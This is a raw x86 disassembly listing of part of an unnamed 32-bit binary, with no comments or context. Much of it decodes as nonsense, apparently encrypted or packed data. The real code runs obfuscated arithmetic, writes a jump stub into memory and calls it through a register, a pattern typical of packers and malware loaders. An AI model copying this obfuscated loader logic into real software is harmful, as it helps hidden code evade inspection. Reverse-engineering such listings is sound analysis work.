  40d528:	in     eax,dx
  40d529:	jns    0x40d586
  40d52b:	sub    DWORD PTR [ecx-0x41],0x9f23bd5b
  40d532:	scas   al,BYTE PTR es:[edi]
  40d533:	sbb    al,0x40
  40d535:	enter  0x4306,0xdf
  40d539:	add    ebp,edx
  40d53b:	push   edi
  40d53c:	psubw  mm1,QWORD PTR [ebx+0x67]
  40d540:	push   cs
  40d541:	adc    BYTE PTR [eax+0x1b0490bd],ch
  40d547:	adc    bl,al
  40d549:	xor    eax,0x9dc863c5
  40d54e:	mov    ?,WORD PTR [edx]
  40d550:	push   esi
  40d551:	sbb    ebx,ecx
  40d553:	lods   eax,DWORD PTR ds:[esi]
  40d554:	dec    esp
  40d555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d556:	adc    DWORD PTR [ebx-0x78128b1e],eax
  40d55c:	mov    BYTE PTR [ebx+0x76516f17],ah
  40d562:	pop    edx
  40d563:	mov    dh,0x35
  40d565:	dec    edi
  40d566:	push   ss
  40d567:	pop    DWORD PTR [ebx+edi*4+0x75e26cfc]
  40d56e:	xor    esi,DWORD PTR [eax]
  40d570:	(bad)  
  40d572:	xchg   ecx,eax
  40d573:	int3   
  40d574:	xchg   ebp,eax
  40d575:	mov    al,0xe7
  40d577:	aaa    
  40d578:	enter  0xa713,0x28
  40d57c:	add    ch,BYTE PTR [ecx-0x32]
  40d57f:	popf   
  40d580:	imul   edi,edi,0xffffffd8
  40d583:	sbb    eax,0xcf486cad
  40d588:	adc    edx,DWORD PTR [eax+0x7f]
  40d58b:	and    dl,BYTE PTR [ebp+0x1c]
  40d58e:	push   0xbf717487
  40d593:	retf   
  40d594:	sar    BYTE PTR es:[edx-0x21],0x82
  40d599:	cmp    bh,BYTE PTR [ecx+0x2611a92a]
  40d59f:	sub    ebx,DWORD PTR [ecx+eax*1-0x1a]
  40d5a3:	xlat   BYTE PTR ds:[ebx]
  40d5a4:	mov    eax,DWORD PTR [ebp-0xc]
  40d5a7:	sub    ecx,eax
  40d5a9:	imul   ecx,ecx,0x7480
  40d5af:	add    ecx,DWORD PTR [ebp-0x58]
  40d5b2:	mov    eax,DWORD PTR [ebp-0x8]
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x422286
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x422708
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x422708
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x422810
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x422808],eax
  40d707:	inc    DWORD PTR ds:0x422810
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x422584
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x4227f8
  40d78f:	push   DWORD PTR ds:0x42258c
  40d795:	push   DWORD PTR ds:0x4227d8
  40d79b:	push   DWORD PTR ds:0x42284c
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x422708
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	stos   BYTE PTR es:[edi],al
  40d7f8:	mov    edi,0xf065cff4
  40d7fd:	mov    esi,0xbec492be
  40d802:	mov    esi,0xc38deea5
  40d807:	or     DWORD PTR [eax+edi*2-0x5022117e],ecx
  40d80e:	xchg   ebx,eax
  40d80f:	(bad)  
  40d810:	cli    
  40d811:	rcr    DWORD PTR [ebx-0x50eac765],1
  40d817:	dec    edx
  40d818:	cwde   
  40d819:	xlat   BYTE PTR ds:[ebx]
  40d81a:	pushf  
  40d81b:	mov    esp,0xc4a22127
  40d820:	and    eax,DWORD PTR [ebx+0x4df244c6]
  40d826:	jge    0x40d7bd
  40d828:	xchg   ecx,eax
  40d829:	pop    esi
  40d82a:	adc    BYTE PTR [eax+0x64],0x46
  40d82e:	and    eax,0xbf631efa
  40d833:	pop    ebp
  40d834:	fldenv [edi-0x78dae146]
  40d83a:	pop    esp
  40d83b:	aam    0x1a
  40d83d:	out    0x8,al
  40d83f:	pop    eax
  40d840:	dec    eax
  40d841:	dec    edi
  40d842:	xchg   ecx,eax
  40d843:	sub    edx,DWORD PTR [eax-0x33]
  40d846:	and    al,0xa2
  40d848:	popf   
  40d849:	mov    WORD PTR [ebx+0x51962db6],ss
  40d84f:	push   eax
  40d850:	lock jg 0x40d801
  40d853:	add    DWORD PTR [ebp-0x5ad2f48],0xa63a5bc4
  40d85d:	test   DWORD PTR [ecx+eiz*2+0x41],ebx
  40d861:	ins    DWORD PTR es:[edi],dx
  40d862:	test   BYTE PTR [esi+0x40096797],0xc4
  40d869:	daa    
  40d86a:	sar    DWORD PTR [ecx+0x53],1
  40d86d:	add    BYTE PTR [eax-0x56],al
  40d870:	or     eax,0x69eb4957
  40d875:	sbb    eax,0x9e7fc599
  40d87a:	fisubr WORD PTR [edx-0x45]
  40d87d:	and    eax,0x4c0ad660
  40d882:	push   edx
  40d883:	retf   
  40d884:	pop    ebp
  40d885:	(bad)  
  40d886:	push   edi
  40d887:	test   ebx,edi
  40d889:	inc    ebx
  40d88a:	push   0x78254bdc
  40d88f:	popa   
  40d890:	jmp    0xa5c5:0x73cf9d6b
  40d897:	popa   
  40d898:	stc    
  40d899:	shl    BYTE PTR [ecx-0x1e],0xef
  40d89d:	cld    
  40d89e:	int3   
  40d89f:	add    BYTE PTR [edx-0x4f],bh
  40d8a2:	sbb    cl,BYTE PTR [eax+0x10a9efca]
  40d8a8:	pushf  
  40d8a9:	leave  
  40d8aa:	push   eax
  40d8ab:	jb     0x40d8f4
  40d8ad:	fwait
  40d8ae:	(bad)  
  40d8af:	push   esp
  40d8b0:	inc    ebx
  40d8b1:	jo     0x40d858
  40d8b3:	dec    esi
  40d8b5:	xchg   esi,eax
  40d8b6:	inc    esi
  40d8b7:	push   ebp
  40d8b8:	pop    esp
  40d8b9:	mov    dh,0x8b
  40d8bb:	jp     0x40d8eb
  40d8bd:	test   DWORD PTR [eax-0x5e],esp
  40d8c0:	dec    esi
  40d8c1:	pop    es
  40d8c2:	mov    edi,0x61a5503
  40d8c7:	mov    eax,0xfc3e276e
  40d8cc:	outs   dx,BYTE PTR ds:[esi]
  40d8cd:	push   edx
  40d8ce:	and    BYTE PTR [ecx+eax*1],0x69
  40d8d2:	retf   0x63fe
  40d8d5:	(bad)  
  40d8d6:	mov    edi,DWORD PTR [ecx-0x3b]
  40d8d9:	loopne 0x40d951
  40d8db:	cmp    al,0x3a
  40d8dd:	xor    bl,BYTE PTR [edx-0x399fcf7]
  40d8e3:	loop   0x40d949
  40d8e5:	cmp    eax,edi
  40d8e7:	push   0x21
  40d8e9:	xchg   ebp,eax
  40d8ea:	je     0x40d886
  40d8ec:	push   ebx
  40d8ed:	dec    ebx
  40d8ee:	je     0x40d941
  40d8f0:	mov    ds:0x83c85d3f,eax
  40d8f5:	int3   
  40d8f6:	cli    
  40d8f7:	mov    cs,WORD PTR [eax]
  40d8f9:	inc    ebx
  40d8fa:	ret    0x6867
  40d8fd:	or     al,BYTE PTR [eax-0x55993f2c]
  40d903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d904:	test   eax,0x348a8e92
  40d909:	cli    
  40d90a:	(bad)  
  40d90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d90c:	shr    BYTE PTR [ebx],0xd4
  40d90f:	addr16 xchg ebp,eax
  40d911:	js     0x40d8cf
  40d913:	out    dx,eax
  40d914:	sub    eax,edi
  40d916:	int3   
  40d917:	rcr    dh,0xdd
  40d91a:	dec    ebx
  40d91b:	lods   eax,DWORD PTR ds:[esi]
  40d91c:	inc    esp
  40d91d:	jle    0x40d992
  40d91f:	aaa    
  40d920:	retf   0xaa95
  40d923:	sti    
  40d924:	inc    esi
  40d925:	inc    eax
  40d926:	pop    ebx
  40d927:	push   esi
  40d928:	sub    esi,DWORD PTR [eax-0x6bddf1fb]
  40d92e:	mov    ds:0xa5306f8,al
  40d933:	add    esp,DWORD PTR [eax-0x2e]
  40d936:	loopne 0x40d8e0
  40d938:	stc    
  40d939:	or     eax,0x22c188d9
  40d93e:	lods   eax,DWORD PTR ds:[esi]
  40d93f:	fstp   TBYTE PTR [edi+0x58]
  40d942:	aaa    
  40d943:	or     al,BYTE PTR [edx+0x1]
  40d946:	popf   
  40d947:	icebp  
  40d948:	sub    esp,ecx
  40d94a:	dec    esi
  40d94b:	iret   
  40d94c:	push   ecx
  40d94d:	jo     0x40d9a6
  40d94f:	ss dec ebp
  40d951:	popf   
  40d952:	push   ebx
  40d953:	sbb    eax,0x74aa0f57
  40d958:	shl    BYTE PTR [esi+0x7e],0x4e
  40d95c:	push   ebp
  40d95d:	cdq    
  40d95e:	retf   0xcd3e
  40d961:	loop   0x40d903
  40d963:	ds (bad) 
  40d965:	mov    eax,ds:0x45b50caf
  40d96a:	add    edi,edi
  40d96c:	sub    eax,0xd57890
  40d971:	add    eax,0xb56d6a46
  40d976:	push   0xf
  40d978:	or     al,0x3b
  40d97a:	jae    0x40d960
  40d97c:	sbb    al,BYTE PTR [ebp-0x63]
  40d97f:	sub    eax,esi
  40d981:	dec    esi
  40d982:	scas   eax,DWORD PTR es:[edi]
  40d983:	push   esp
  40d984:	jne    0x40d9a8
  40d986:	and    eax,0x4cb51f51
  40d98b:	addr16 push 0xde959aa5
  40d991:	mov    dh,0xdf
  40d993:	ds push ds
  40d995:	sbb    DWORD PTR [ebx-0x12a29427],edx
  40d99b:	daa    
  40d99c:	sub    BYTE PTR [ebp-0x39],dh
  40d99f:	sbb    al,cl
  40d9a1:	jmp    0x16a4:0x585efef7
  40d9a8:	jmp    0x3d4c57c6
  40d9ad:	pop    ebp
  40d9ae:	mov    ch,BYTE PTR [eax]
  40d9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9b1:	mov    bh,dh
  40d9b3:	bound  ecx,QWORD PTR ss:[edi-0x64e9dad9]
  40d9ba:	call   0x5dfe:0x8ddee86d
  40d9c1:	adc    BYTE PTR [edx+0x28],ah
  40d9c4:	retf   0x8bad
  40d9c7:	hlt    
  40d9c8:	mov    dh,0x71
  40d9ca:	push   eax
  40d9cb:	test   al,0x4a
  40d9cd:	ins    DWORD PTR es:[edi],dx
  40d9ce:	push   cs
  40d9cf:	sbb    eax,DWORD PTR [esp+esi*2+0x5d]
  40d9d3:	retf   
  40d9d4:	or     BYTE PTR [ebp+0x2c],0x79
  40d9d8:	out    dx,eax
  40d9d9:	(bad)  
  40d9da:	adc    eax,0x68202e77
  40d9df:	and    ecx,DWORD PTR [eax-0x5cd643fc]
  40d9e5:	lahf   
  40d9e6:	rcr    BYTE PTR [ecx+0x51120fb9],1
  40d9ec:	jp     0x40da4e
  40d9ee:	dec    ebp
  40d9ef:	leave  
  40d9f0:	in     al,0x8c
  40d9f2:	pop    esi
  40d9f3:	mov    ds:0x69ababcc,eax
  40d9f8:	and    al,0x7a
  40d9fa:	imul   esp,edi,0xaadb3d84
  40da00:	sbb    edi,DWORD PTR [ebp+edi*1-0x46]
  40da04:	arpl   WORD PTR [eax+0xd83c12f],si
  40da0a:	adc    BYTE PTR es:[edx],cl
  40da0d:	and    BYTE PTR [esi+0x552366d],bl
  40da13:	or     eax,0xcd802aba
  40da18:	adc    esp,esi
  40da1a:	outs   dx,DWORD PTR ds:[esi]
  40da1b:	pop    esp
  40da1c:	sub    DWORD PTR [edx+0x32901df6],ebp
  40da22:	adc    ah,BYTE PTR [ebx+0x55]
  40da25:	dec    ecx
  40da26:	dec    ebx
  40da27:	pop    edi
  40da28:	pop    ebp
  40da29:	test   DWORD PTR [ebx],esp
  40da2b:	icebp  
  40da2c:	cmp    BYTE PTR [esi-0x61842444],bl
  40da32:	pop    ds
  40da33:	retf   
  40da34:	setns  BYTE PTR [edi+edi*1-0x43]
  40da39:	mov    ds:0xe722d045,al
  40da3e:	dec    esp
  40da3f:	lods   eax,DWORD PTR ds:[esi]
  40da40:	(bad)  
  40da41:	cwde   
  40da42:	iret   
  40da43:	test   eax,0xd72579f3
  40da48:	mov    WORD PTR [esi],?
  40da4a:	cwde   
  40da4b:	xor    DWORD PTR [edi],esp
  40da4d:	(bad)  
  40da4e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da50:	mov    edx,ecx
  40da52:	dec    ebx
  40da53:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da55:	mov    ds:0x92f5cb95,al
  40da5a:	or     dh,bh
  40da5c:	add    cl,BYTE PTR [ebp+edx*8+0x19eec626]
  40da63:	rcl    cl,1
  40da65:	pop    esp
  40da66:	sti    
  40da67:	adc    DWORD PTR [ecx],ebx
  40da69:	test   eax,0x299172c2
  40da6e:	cmp    al,0x2a
  40da70:	push   esi
  40da71:	into   
  40da72:	push   eax
  40da73:	jge    0x40da2b
  40da75:	jo     0x40da51
  40da77:	mov    al,ds:0xa9ba26
  40da7c:	xchg   ecx,eax
  40da7d:	push   0x47ce32bf
  40da82:	test   BYTE PTR [eax],ch
  40da84:	je     0x40da49
  40da86:	mov    al,0xa7
  40da88:	jae    0x40da32
  40da8a:	xor    ch,BYTE PTR [esi+esi*8]
  40da8d:	pushf  
  40da8e:	je     0x40da8f
  40da90:	ins    BYTE PTR es:[edi],dx
  40da91:	xor    ebx,ebp
  40da93:	pop    esi
  40da94:	dec    esi
  40da95:	mov    eax,ds:0x77cb8455
  40da9a:	out    dx,eax
  40da9b:	jnp    0x40da2d
  40da9d:	shr    edi,1
  40da9f:	hlt    
  40daa0:	sbb    ecx,esp
  40daa2:	lds    ecx,FWORD PTR [esi-0x38]
  40daa5:	sbb    eax,0xae1d82b0
  40daaa:	out    0x7,al
  40daac:	jl     0x40da55
  40daae:	push   ecx
  40daaf:	and    al,0x38
  40dab1:	retf   
  40dab2:	add    eax,0x80b5a3a
  40dab7:	loopne 0x40dac1
  40dab9:	sbb    eax,0xf8c7ba70
  40dabe:	loopne 0x40da5c
  40dac0:	mov    esi,0xef4b2083
  40dac5:	sub    BYTE PTR [esi+0x72],al
  40dac8:	and    dl,0x16
  40dacb:	test   al,0x0
  40dacd:	lock (bad) 
  40dacf:	shr    DWORD PTR [ebp+0x54840c91],0xfa
  40dad6:	lock lea ebx,[ebp-0x23]
  40dada:	pop    eax
  40dadb:	jb     0x40daa9
  40dadd:	int    0x1c
  40dadf:	sbb    BYTE PTR [eax-0x3235a461],bl
  40dae5:	int3   
  40dae6:	or     BYTE PTR [ecx],0xab
  40dae9:	arpl   bx,dx
  40daeb:	and    eax,0x7174013
  40daf0:	add    al,0x96
  40daf2:	test   al,0x86
  40daf4:	lods   eax,DWORD PTR ds:[esi]
  40daf5:	sbb    ebp,eax
  40daf7:	cli    
  40daf8:	into   
  40daf9:	xchg   DWORD PTR [ecx+0x6d],ecx
  40dafc:	adc    al,0xaf
  40dafe:	or     DWORD PTR [edx+0x26],edi
  40db01:	dec    ebp
  40db02:	cmp    DWORD PTR [esi+0xe0abc78],eax
  40db08:	adc    cl,BYTE PTR [edi+0x70]
  40db0b:	in     al,dx
  40db0c:	and    esi,DWORD PTR [ecx+0x6d180d90]
  40db12:	bound  ebp,QWORD PTR [ebp-0x7d021efd]
  40db18:	scas   al,BYTE PTR es:[edi]
  40db19:	cwde   
  40db1a:	push   ds
  40db1b:	mov    esp,0x4ffa03a2
  40db20:	stc    
  40db21:	fstp   TBYTE PTR [esi]
  40db23:	pop    es
  40db24:	or     dl,BYTE PTR [edi-0x29]
  40db27:	mov    bh,0xa9
  40db29:	adc    BYTE PTR [eax-0x1d8b6803],dh
  40db2f:	rcr    cl,0x53
  40db32:	outs   dx,DWORD PTR ds:[esi]
  40db33:	push   edx
  40db34:	xor    BYTE PTR [ebp+0x293a6f94],ah
  40db3a:	push   cs
  40db3b:	push   dx
  40db3d:	jmp    0x40db67
  40db3f:	std    
  40db40:	cmc    
  40db41:	loopne 0x40db66
  40db43:	mov    edi,ebx
  40db45:	rol    DWORD PTR [edi],0x1b
  40db48:	cmp    DWORD PTR [edi+0x33d2e793],ebx
  40db4e:	fwait
  40db4f:	ret    
  40db50:	mov    eax,ds:0xfc0501df
  40db55:	sbb    edx,ecx
  40db57:	addr16 loopne 0x40dbb5
  40db5a:	cmp    BYTE PTR [ecx+0x2b7ca2e2],al
  40db60:	sbb    DWORD PTR [ebx-0x70],eax
  40db63:	sahf   
  40db64:	fldenv [eax+edi*2+0x16]
  40db68:	adc    DWORD PTR [ecx+0x6e],edx
  40db6b:	sub    eax,0x98b4ecb
  40db70:	cmp    eax,0x128706de
  40db75:	sbb    al,BYTE PTR [edi-0x2d]
  40db78:	sub    dh,BYTE PTR [ecx-0x371d0d42]
  40db7e:	ret    0xb5a8
  40db81:	mov    ds,WORD PTR [esi-0x38936b52]
  40db87:	outs   dx,BYTE PTR ds:[esi]
  40db88:	jb     0x40db7a
  40db8a:	or     BYTE PTR [edi-0x17462bc4],ch
  40db90:	pop    edx
  40db91:	push   edx
  40db92:	lods   al,BYTE PTR ds:[esi]
  40db93:	pop    es
  40db94:	xor    ebp,DWORD PTR [esi]
  40db96:	in     eax,dx
  40db97:	aas    
  40db98:	nop
  40db99:	adc    edi,DWORD PTR [eax]
  40db9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db9c:	in     al,dx
  40db9d:	push   eax
  40db9e:	adc    BYTE PTR ds:0x5d7a876d,al
  40dba4:	call   0x87d8:0x10e0d478
  40dbab:	jp     0x40dbdb
  40dbad:	scas   eax,DWORD PTR es:[edi]
  40dbae:	fsubrp st(6),st
  40dbb0:	inc    ecx
  40dbb1:	inc    ebx
  40dbb2:	mul    DWORD PTR [edx]
  40dbb4:	sub    eax,0x13cad138
  40dbb9:	dec    esi
  40dbba:	aam    0x5f
  40dbbc:	sub    BYTE PTR [edi+0x19],0x3b
  40dbc0:	jl     0x40dbc5
  40dbc2:	cld    
  40dbc3:	pop    esi
  40dbc4:	mov    al,ds:0x6674d2f4
  40dbc9:	test   al,0xc8
  40dbcb:	cmp    eax,0x1b1681be
  40dbd0:	push   ecx
  40dbd1:	dec    edx
  40dbd2:	bound  edi,QWORD PTR [esi-0x25]
  40dbd5:	cs mov edx,0x2f3dd800
  40dbdb:	and    DWORD PTR [ecx],eax
  40dbdd:	data16 jecxz 0x40db9b
  40dbe0:	pop    ecx
  40dbe1:	sub    al,0xf4
  40dbe3:	cmc    
  40dbe4:	scas   eax,DWORD PTR es:[edi]
  40dbe5:	adc    eax,0x7ff14fb8
  40dbea:	sbb    al,0x59
  40dbec:	and    al,0xa4
  40dbee:	loopne 0x40dbf7
  40dbf0:	pop    es
  40dbf1:	pop    esi
  40dbf2:	pop    ebx
  40dbf3:	leave  
  40dbf4:	ret    0x4
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	ror    ebx,1
  40dc2d:	xor    DWORD PTR [edi+ecx*8-0x414107c7],esi
  40dc34:	cdq    
  40dc35:	ret    0xbebe
  40dc38:	push   ds
  40dc39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc3a:	xchg   edx,eax
  40dc3b:	sar    eax,0xe9
  40dc3e:	fidiv  DWORD PTR [ecx-0x2e3b48c7]
  40dc44:	pop    esi
  40dc45:	sub    DWORD PTR ds:0xd2612eb3,ebx
  40dc4b:	nop
  40dc4c:	mov    edi,DWORD PTR ds:0x8f4ae52c
  40dc52:	pop    ebp
  40dc53:	inc    esi
  40dc54:	push   0xc64f6aaa
  40dc59:	jb     0x40dc04
  40dc5b:	in     eax,dx
  40dc5c:	scas   al,BYTE PTR es:[edi]
  40dc5d:	mov    dh,BYTE PTR [edx-0x1e630ca1]
  40dc63:	call   0x251db8bb
  40dc68:	pop    es
  40dc69:	je     0x40dcb9
  40dc6b:	lahf   
  40dc6c:	and    al,0x42
  40dc6e:	shl    cl,1
  40dc70:	dec    ebx
  40dc71:	clc    
  40dc72:	out    dx,al
  40dc73:	mov    esi,0x8b327f26
  40dc78:	sti    
  40dc79:	or     BYTE PTR [esi+esi*1+0x39d8dbad],ch
  40dc80:	bound  ebx,QWORD PTR [ebx+0x5c7dbdbf]
  40dc86:	loope  0x40dcbe
  40dc88:	xchg   esp,eax
  40dc89:	enter  0xa9ca,0x50
  40dc8d:	xchg   esi,eax
  40dc8e:	add    BYTE PTR [ebp-0x2fe88858],dl
  40dc94:	cmp    eax,0x2a20f599
  40dc99:	test   eax,0xe27041dd
  40dc9e:	jne    0x40dc3d
  40dca0:	retf   0x4b61
  40dca3:	cmp    eax,eax
  40dca5:	adc    eax,0xb1af20c9
  40dcaa:	cmc    
  40dcab:	xchg   ecx,eax
  40dcac:	loope  0x40dd28
  40dcae:	pusha  
  40dcaf:	mov    dl,0x6b
  40dcb1:	fbstp  TBYTE PTR [ebx+eiz*1+0x72f1c4e8]
  40dcb8:	and    eax,DWORD PTR [esi+ebx*8]
  40dcbb:	mov    fs,WORD PTR ds:0x61bd276a
  40dcc1:	adc    BYTE PTR [eax-0x20],dl
  40dcc4:	fisttp DWORD PTR [eax+edx*4-0x6be0b418]
  40dccb:	adc    eax,DWORD PTR [ebp+0xbe10fd0]
  40dcd1:	jmp    0x40dd06
  40dcd3:	sub    eax,0x9f279476
  40dcd8:	aaa    
  40dcd9:	aaa    
  40dcda:	adc    eax,ebp
  40dcdc:	xlat   BYTE PTR ds:[ebx]
  40dcdd:	xor    eax,0xcd7c58d5
  40dce2:	adc    DWORD PTR [ecx-0x1ce59a19],edx
  40dce8:	pop    ss
  40dce9:	arpl   WORD PTR [ecx-0x46a388bb],di
  40dcef:	push   ss
  40dcf0:	jnp    0x40dcb4
  40dcf2:	scas   eax,DWORD PTR es:[edi]
  40dcf3:	inc    edx
  40dcf4:	test   DWORD PTR [eax],edx
  40dcf6:	lds    edi,FWORD PTR [eax-0x28]
  40dcf9:	xor    ch,dh
  40dcfb:	es sahf 
  40dcfd:	sbb    eax,0x32007550
  40dd02:	fcmove st,st(6)
  40dd04:	mov    ah,0xec
  40dd06:	lea    eax,[eax+0x78]
  40dd09:	aaa    
  40dd0a:	ret    0x2b17
  40dd0d:	test   eax,eax
  40dd0f:	mov    ds,WORD PTR [ebx+0x34]
  40dd12:	loop   0x40dcc3
  40dd14:	inc    ebx
  40dd15:	push   esi
  40dd16:	hlt    
  40dd17:	fild   QWORD PTR [edx+eiz*1]
  40dd1a:	jecxz  0x40dcb1
  40dd1c:	loopne 0x40dcf0
  40dd1e:	pushf  
  40dd1f:	xchg   DWORD PTR [ebx+0x79c34c70],esp
  40dd25:	out    0x46,eax
  40dd27:	(bad)
  40dd2b:	mov    ebx,0x4de4c356
  40dd30:	icebp  
  40dd31:	push   ebp
  40dd32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd33:	sub    eax,0x16bc1464
  40dd38:	jbe    0x40dcbe
  40dd3a:	mov    ch,0x77
  40dd3c:	dec    ebp
  40dd3d:	or     ax,bx
  40dd40:	xor    eax,0x66349bce
  40dd45:	cmp    bh,BYTE PTR [edi-0x8]
  40dd48:	gs fwait
  40dd4a:	mov    ebp,0x692b56e
  40dd4f:	pop    es
  40dd50:	push   0xba4ce203
  40dd55:	lahf   
  40dd56:	scas   eax,DWORD PTR es:[edi]
